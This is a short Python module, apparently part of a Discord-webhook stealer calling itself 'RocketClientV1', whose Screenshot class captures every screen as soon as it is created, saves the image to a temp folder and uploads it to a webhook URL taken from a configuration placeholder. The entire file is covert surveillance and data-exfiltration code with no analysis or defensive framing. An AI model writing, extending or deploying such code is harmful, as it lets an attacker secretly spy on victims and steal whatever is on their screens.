from PIL import ImageGrab
from requests_toolbelt.multipart.encoder import MultipartEncoder
import json
import requests

class Screenshot:
    def __init__(self):
        self.take_screenshot()
        self.send_screenshot()

    def take_screenshot(self):  
        image = ImageGrab.grab(
                    bbox=None,
                    all_screens=True,
                    include_layered_windows=False,
                    xdisplay=None
                )
        image.save(temp_path + "\\desktopshot.png")
        image.close()

    def send_screenshot(self):
        webhook_data = {
            "username": "RocketClientV1",
            "avatar_url": "https://cdn.discordapp.com/attachments/1252951673048010814/1254481481196241007/rocket.png?ex=6679a66c&is=667854ec&hm=6c090b294eeb97741f7c1451305da80dda7f5afa1c301875cbd99e0737d7ae21&",
            "embeds": [
                {
                    "color": 5639644,
                    "title": "Desktop Screenshot",
                    "image": {
                        "url": "attachment://image.png"
                    }
                }
            ]
        }
        
        with open(temp_path + "\\desktopshot.png", "rb") as f:
            image_data = f.read()
            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

        requests.post(__CONFIG__["webhook"], headers={'Content-type': encoder.content_type}, data=encoder)